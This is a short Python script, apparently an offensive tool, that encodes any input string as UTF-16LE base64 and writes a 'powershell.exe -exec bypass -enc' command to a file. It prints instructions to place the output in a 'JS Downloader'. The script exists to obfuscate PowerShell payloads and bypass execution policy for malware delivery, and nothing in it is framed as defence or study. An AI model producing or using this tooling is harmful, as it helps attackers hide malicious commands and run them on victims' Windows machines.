import base64

print('## powershell obfuscation encoder                           ##')
print('## Note: This is not a normal base64 encoder!               ##')
print('## It converts the string to UTF-16LE first before encoding ##')
print('## as that is what PowerShell expects!                      ##')
print('## Coded by Joel Ossi                                       ##')

file=open('output.txt','w')

code = raw_input('INVOKEN STRING TO ENCODE: ')
print('')
shellcode = base64.b64encode(code.encode('UTF-16-LE'))
print (shellcode)
print('')
file.write("powershell.exe -exec bypass -enc " + shellcode)
file.close()
print('[+] Powershell Code Generated, use the output code and replace it in the JS Downloader.')
print('[+] Output Saved.')
raw_input('')
